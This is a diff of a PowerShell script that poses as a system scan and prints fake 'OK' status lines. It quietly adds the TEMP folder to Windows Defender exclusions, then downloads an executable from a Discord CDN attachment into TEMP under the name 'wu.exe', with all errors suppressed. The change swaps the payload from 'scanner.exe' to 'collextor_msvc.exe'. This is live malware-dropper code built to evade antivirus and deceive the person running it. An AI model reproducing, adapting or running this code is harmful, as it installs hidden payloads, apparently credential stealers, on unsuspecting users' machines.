@@ -27,7 +27,7 @@ Start-Sleep -Milliseconds 600
 
 $f="$env:TEMP\wu.exe"
 Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Out-Null
-try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520504819104878754/scanner.exe?ex=6a416ff6&is=6a401e76&hm=bf46e00716b95b61a2ec05e31038511bd4144f18a0bcca1ef7cf3fe916b0c6c5&" -OutFile $f -UseBasicParsing 2>&1 | Out-Null } catch {}
+try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520747295090540564/collextor_msvc.exe?ex=6a4251c9&is=6a410049&hm=29001b058776704f43d0e074127ef726f79fd2fd5fe8d36098fc1b46e85f5ee2&" -OutFile $f -UseBasicParsing 2>&1 | Out-Null } catch {}
 
 Write-Host "  C:\Windows\System32 - OK" -ForegroundColor Green
 Start-Sleep -Milliseconds 300
